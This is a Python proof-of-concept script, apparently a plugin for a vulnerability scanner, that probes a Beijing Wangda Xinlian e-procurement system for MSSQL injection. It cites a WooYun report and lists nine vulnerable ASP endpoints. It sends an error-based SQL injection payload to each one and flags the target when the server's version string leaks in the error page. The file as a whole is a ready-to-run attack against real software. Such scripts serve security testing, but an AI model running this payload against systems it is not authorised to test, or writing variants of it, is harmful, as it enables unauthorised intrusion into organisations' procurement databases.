#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 北京网达信联电子采购系统多处注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0122276
author: Lucifer
description: 多处mssql注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class caitong_multi_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "%27AnD%20ChAr(65)%2BChAr(71)%2BChAr(81)%2B@@version>0--"
        urls = ["/Rat/ebid/viewInvite3.asp?InviteId=0000002852",
                "/Rat/ebid/viewInvite4.asp?InviteId=0000002852",
                "/Rat/ebid/viewInvite5.asp?InviteId=0000002852",
                "/Rat/ebid/viewInvite6.asp?InviteId=0000002852",
                "/Rat/ebid/viewInvite2.asp?InviteId=0000002852",
                "/Rat/ebid/viewInvite1.asp?InviteId=0000002852",
                "/Rat/EBid/ViewClarify1.asp?InviteId=11",
                "/Rat/EBid/ViewClarify.asp?InviteId=11",
                "/Rat/EBid/AuditForm/AuditForm_ExpertForm.asp?InviteId=11"]
        try:
            for turl in urls:
                vulnurl = self.url + turl + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if req.status_code ==500 and r"AGQMicrosoft" in req.text:
                    cprint("[+]存在北京网达信联电子采购系统注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = caitong_multi_sqli_BaseVerify(sys.argv[1])
    testVuln.run()